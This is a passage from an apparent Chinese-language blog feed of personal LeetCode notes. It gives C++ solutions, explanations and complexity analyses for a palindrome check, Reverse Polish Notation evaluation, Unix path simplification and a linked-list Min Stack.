class="number">57</span>)&#123;</span><br><span class="line">                tempStr+=c;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(c&gt;= <span class="number">65</span> &amp;&amp; c&lt;=<span class="number">90</span>)&#123;</span><br><span class="line">                tempStr+=c+<span class="number">32</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(c&gt;=<span class="number">97</span> &amp;&amp; c&lt;=<span class="number">122</span>)&#123;</span><br><span class="line">                tempStr+=c;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(tempStr == <span class="string">&quot;&quot;</span> ) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> length=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (tempStr.<span class="built_in">size</span>() %<span class="number">2</span> != <span class="number">0</span>)&#123;</span><br><span class="line">            length = ((<span class="type">int</span>)tempStr.<span class="built_in">size</span>()/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            length = ((<span class="type">int</span>)tempStr.<span class="built_in">size</span>()/<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (tempStr[i]!=tempStr[tempStr.<span class="built_in">size</span>()-i<span class="number">-1</span>])&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                isPalindrome = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> isPalindrome;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以參考 Ascii Table</p><p><img src="/img/LeetCode/125/ascii.png"></p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/125/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li>首先在遍歷跟轉換字串的迴圈，複雜度為 $O(n)$，$n$ 為字串數量</li><li>接下來 two pointer 檢查回文的地方，複雜度為 $O(m&#x2F;2)$，worst case 會是 $m&#x3D;n$</li><li>整體時間複雜度會是 $O(n)+O(m&#x2F;2) &#x3D; O(n)$</li></ul><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li>程式碼中建立了一個新的字串 <code>tempStr</code>，其最壞情況下的長度為 n。因此，這段程式碼的空間複雜度是 $O(n)$</li><li><code>isPalindrome </code> 和 <code>length</code> 這些變數只佔用常數空間，因此其空間複雜度是 $O(1)$</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Two Pointers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>計算逆波蘭表示法 | Medium | LeetCode#150. Evaluate Reverse Polish Notation</title>
      <link href="/posts/49a7f4a8.html"/>
      <url>/posts/49a7f4a8.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/150/question1.jpeg"><br><img src="/img/LeetCode/150/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目描述: 本題要求給定一個字串陣列 <code>tokens</code>，當中是以 <strong><a href="https://zh.wikipedia.org/wiki/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E7%A4%BA%E6%B3%95">逆波蘭表示法</a></strong> 的算式運算式，需要回傳算術運算的結果，結果為整數型態。</li></ul><p>注意:</p><ul><li>有效的運算子只會有: <code>+</code>, <code>-</code>, <code>*</code>,<code>/</code>。</li><li>Operand 都會是整數</li><li>除法採無條件捨去法</li><li>不可除以0</li><li>中間運算的數字會是 32-bit 整數</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>如果看上面的範例 <code>[&quot;4&quot;,&quot;13&quot;,&quot;5&quot;,&quot;/&quot;,&quot;+&quot;]</code>，可以看出，如果碰到operator，碰到operator前的兩個數字就會透過該operator進行運算。</p><p>因此我的想法是:</p><ol><li>建立一個stack</li><li>迭代 <code>tokens</code> 若遇到數字就push進stack</li><li>若遇到運算子，則將兩個元素pop出來進行四則運算</li><li>運算結果丟回 stack</li><li>迭代完畢後回傳 stacK 頂端元素</li></ol><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">evalRPN</span><span class="params">(vector&lt;string&gt;&amp; tokens)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; sk;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; tokens.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            string token = tokens[i];</span><br><span class="line">            <span class="keyword">if</span> (token == <span class="string">&quot;+&quot;</span> || token == <span class="string">&quot;-&quot;</span> || token == <span class="string">&quot;*&quot;</span> || token == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">                <span class="type">int</span> arg2 = sk.<span class="built_in">top</span>(); sk.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="type">int</span> arg1 = sk.<span class="built_in">top</span>(); sk.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span> (token == <span class="string">&quot;+&quot;</span>) sk.<span class="built_in">push</span>(arg1 + arg2);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (token == <span class="string">&quot;-&quot;</span>) sk.<span class="built_in">push</span>(arg1 - arg2);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (token == <span class="string">&quot;*&quot;</span>) sk.<span class="built_in">push</span>(arg1 * arg2);</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (token == <span class="string">&quot;/&quot;</span>) sk.<span class="built_in">push</span>(<span class="built_in">floor</span>(arg1 / arg2));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sk.<span class="built_in">push</span>(<span class="built_in">stoi</span>(token));  <span class="comment">// Use stoi to convert string to int</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sk.<span class="built_in">top</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>這裡宣告的 stack 是 <code>int</code> type 的，所以在push的時候要注意 type的轉換，這裡用<string> 當中的 <code>stoi</code> 函數將字串轉換成整數。</li><li>另外還要注意，pop出來的第一個元素會是在operator後面，也就是如過現在是除法，那要pop出來的元素就會是分子，所以順序要注意</li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/150/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>時間複雜度：$O(n)$，其中 n 是輸入tokens的數量。</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>空間複雜度：$O(n)$，其中 n 是輸入tokens的數量。</p><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>這次紙上先寫出演算法大概花7分鐘，實際寫大概20min AC，還是有待加強。</p><blockquote><p>Note: 字串轉數字:<code>stoi()</code>，數字轉字串: <code>to_string()</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>簡化路徑 | Medium | LeetCode#71. Simplify Path</title>
      <link href="/posts/59f3a7b5.html"/>
      <url>/posts/59f3a7b5.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/71/question1.jpeg"><br><img src="/img/LeetCode/71/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 題目會給定一個 Unix 系統的檔案路徑字串，這題需要簡化路徑，並輸出簡化後的路徑字串。簡化路徑有下面幾項規則:<ul><li>字串始終由 <code>/</code> 開始</li><li>路徑中的目錄僅可由一個 <code>/</code> 分隔開</li><li>除了 Root Dir 之外，不可由 <code>/</code> 作為字串結尾</li><li>輸出需要排除 <code>.</code> 或者 <code>..</code></li></ul></li></ul><p>在 Unix 系統中 <code>.</code> 代表當前目錄，可忽略，<code>..</code> 代表跳到上一層目錄，舉例來說 <code>/home/kevin/../LeetCode</code> &#x3D; <code>/home/LeetCode</code>  </p><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><ul><li>獲取 <code>/</code> 與 <code>/</code> 中間的字串(即目錄)，如果滿足規則就 push 進 stack 中</li><li>如果 <code>/</code>與 <code>/</code> 中間會是 <code>.</code> 則跳過，如果是 <code>..</code> 則將stack中元素 pop 出來</li><li>其餘的通通 push 到 stack 當中</li><li>之後就是依序將 stack 元素 pop 出來並串接在回傳字串當中</li></ul><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">simplifyPath</span><span class="params">(string path)</span> </span>&#123;</span><br><span class="line">        string output=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        stack&lt;string&gt; sk;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;path.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(path[i]==<span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            string temp=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;path.<span class="built_in">size</span>() &amp;&amp; path[i] != <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">            temp += path[i];</span><br><span class="line">            ++i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(temp==<span class="string">&quot;.&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(temp==<span class="string">&quot;..&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                    sk.<span class="built_in">pop</span>();    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                sk.<span class="built_in">push</span>(temp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(!sk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            output = <span class="string">&#x27;/&#x27;</span>+sk.<span class="built_in">top</span>() + output;</span><br><span class="line">            sk.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(output.<span class="built_in">size</span>() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> output;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>初始化變數</li><li>遇到 <code>/</code> 直接跳過</li><li>使用 <code>temp</code> 來記錄目錄名稱直到遇到下一個 <code>/</code></li><li>如果 <code>temp</code> 會是 <code>.</code> ，代表當前目錄，直接跳過</li><li>如果 <code>temp</code> 會是 <code>..</code> ，代表上一層目錄，若 stack 非空，則直接將 stack 頂端元素 pop出來</li><li>其他狀況都將 <code>temp</code> push 到 stack 中</li><li>之後依序將 stack 元素加到 <code>output</code> 中</li><li>單獨處理簡化後只剩下 Root Dir的狀況</li></ul><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/71/results.jpeg"></p><h1 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li>Traverse輸入字串: $o(n)$, n為字串長度</li><li>push, pop: $O(1)$</li><li>建構輸出: $o(m)$, m為stack中元素數量<br>整體而言會是 $O(n)$</li></ul><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li>在最壞情況下，如果所有的 <code>temp</code> 都是有效的路徑段落，stack中會存儲 n 個段落。因此，stack的空間複雜度是 $O(n)$</li><li>最終輸出的字串 <code>output</code> 也會最多包含 n 個字元，因此它的空間複雜度是 $O(n)$</li><li>整段程式碼的空間複雜度是 $O(n)$</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Min 堆疊 | Medium | LeetCode#155 Min Stack</title>
      <link href="/posts/511cdb2f.html"/>
      <url>/posts/511cdb2f.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/155/question.jpeg"><br><img src="/img/LeetCode/155/question2.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 題目要求設計一個 Stack, 可以支援 push, pop, top 以及在常數時間內獲取最小值</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MinStack</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> val, size = <span class="number">0</span>;</span><br><span class="line">    MinStack *next;</span><br><span class="line">    MinStack *Top = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MinStack</span>() : <span class="built_in">val</span>(<span class="number">0</span>), <span class="built_in">next</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">MinStack</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">MinStack</span>(<span class="type">int</span> x, MinStack *nextNode) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(nextNode) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> val)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getMin</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MinStack::push</span><span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        Top = <span class="keyword">new</span> <span class="built_in">MinStack</span>(val);</span><br><span class="line">        size++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    MinStack *newNode = <span class="keyword">new</span> <span class="built_in">MinStack</span>(val);</span><br><span class="line">    newNode-&gt;next = Top;</span><br><span class="line">    Top = newNode;</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MinStack::pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    MinStack *tempNode = Top;</span><br><span class="line">    Top = Top-&gt;next;</span><br><span class="line">    <span class="keyword">delete</span> tempNode;</span><br><span class="line">    size--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MinStack::top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> Top-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MinStack::getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    MinStack *ptr = Top;</span><br><span class="line">    <span class="type">int</span> minValue = ptr-&gt;val;</span><br><span class="line">    <span class="keyword">while</span> (ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ptr-&gt;val &lt; minValue) &#123;</span><br><span class="line">            minValue = ptr-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = ptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> minValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MinStack::isEmpty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Top == <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MinStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MinStack* obj = new MinStack();</span></span><br><span class="line"><span class="comment"> * obj-&gt;push(val);</span></span><br><span class="line"><span class="comment"> * obj-&gt;pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj-&gt;top();</span></span><br><span class="line"><span class="comment"> * int param_4 = obj-&gt;getMin();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><blockquote><p>這裡我選擇用 Linked List 來實作 Stack</p></blockquote><p>首先是宣告成員變數<br>    - <code>int val</code>: 節點值。<br>    - <code>int size</code>: Stack大小，初始化為 0。<br>    - <code>MinStack *next</code>: 指向下一個節點的指標<br>    - <code>MinStack *Top</code>: 指向Stack頂端的指標，初始化為 NULL。<br>接著定義 Constructor</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">MinStack</span>() : <span class="built_in">val</span>(<span class="number">0</span>), <span class="built_in">next</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"><span class="built_in">MinStack</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"><span class="built_in">MinStack</span>(<span class="type">int</span> x, MinStack *nextNode) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(nextNode) &#123;&#125;</span><br></pre></td></tr></table></figure><ul><li>這裡有三個constructor，分別對應處理，甚麼參數都沒給，只給節點值，兩個都給的狀況，來初始化節點</li><li>之後定義成員函數<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">int</span> val)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">top</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getMin</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure></li></ul><p>Push</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MinStack::push</span><span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        Top = <span class="keyword">new</span> <span class="built_in">MinStack</span>(val);</span><br><span class="line">        size++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    MinStack *newNode = <span class="keyword">new</span> <span class="built_in">MinStack</span>(val);</span><br><span class="line">    newNode-&gt;next = Top;</span><br><span class="line">    Top = newNode;</span><br><span class="line">    size++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>將值 <code>val</code> 推入Stack</li><li>如果Stack為空，則初始化並設置 <code>Top</code> 為新節點</li><li>如果不為空，則創建新節點並將其壓入Stack頂部，實踐了等同 <code>push_front</code> 的功能</li></ul><p>pop</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MinStack::pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    MinStack *tempNode = Top;</span><br><span class="line">    Top = Top-&gt;next;</span><br><span class="line">    <span class="keyword">delete</span> tempNode;</span><br><span class="line">    size--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>將頂端元素彈出Stack</li><li>更新 <code>Top</code> 指向下一個節點並釋放要被pop的節點。</li></ul><p>top</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">MinStack::top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> Top-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>返回頂端元素的值，若為空，返回 -1。</li></ul><p>getMin</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">MinStack::getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    MinStack *ptr = Top;</span><br><span class="line">    <span class="type">int</span> minValue = ptr-&gt;val;</span><br><span class="line">    <span class="keyword">while</span> (ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ptr-&gt;val &lt; minValue) &#123;</span><br><span class="line">            minValue = ptr-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = ptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> minValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Traverse stack，找到最小值，並返回最小值。</li></ul><p>isEmpty</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span 